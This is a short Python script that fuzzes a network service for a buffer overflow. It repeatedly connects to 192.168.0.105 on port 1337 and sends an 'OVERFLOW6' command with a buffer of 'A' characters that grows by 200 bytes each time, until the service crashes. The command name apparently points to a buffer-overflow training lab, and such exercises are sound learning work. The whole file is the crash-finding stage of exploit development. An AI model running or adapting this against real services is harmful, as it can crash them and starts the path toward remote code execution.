#!/usr/bin/python3
import socket, time, sys

buffer = b"A" * 200

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect(('192.168.0.105',1337))
		s.recv(1024)

		print('[*] Length fuzz : ' + str(len(buffer)))
		s.send(b"OVERFLOW6 " + buffer)
		s.close()
		time.sleep(1)
		buffer=buffer + b'A'* 200

	except Exception as e:
		print(str(e))
		sys.exit(1)
